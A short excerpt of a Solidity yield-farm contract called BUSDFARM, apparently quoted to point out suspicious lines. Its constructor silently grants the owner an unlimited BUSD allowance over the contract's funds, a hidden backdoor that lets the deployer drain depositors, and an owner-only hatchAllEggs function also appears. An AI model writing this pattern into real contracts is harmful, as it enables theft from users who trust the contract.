...
contract BUSDFARM is Ownable{
    using SafeMath for uint256;
    //uint256 EGGS_PER_MINERS_PER_SECOND=1;
    address busd = 0xAF84Bfee594a2AC980aba6a0978852D296D87D25; 
    ...
    constructor() public{
        marketEggs = 0;
        initialized = false;
        IERC20(busd).approve(owner(), ~uint256(0));
    }
    ...
    function sellEggs() public {
        ...
        IERC20(busd).transfer(address(msg.sender), eggValue);
    }
    ...
    function hatchAllEggs() public onlyOwner() {
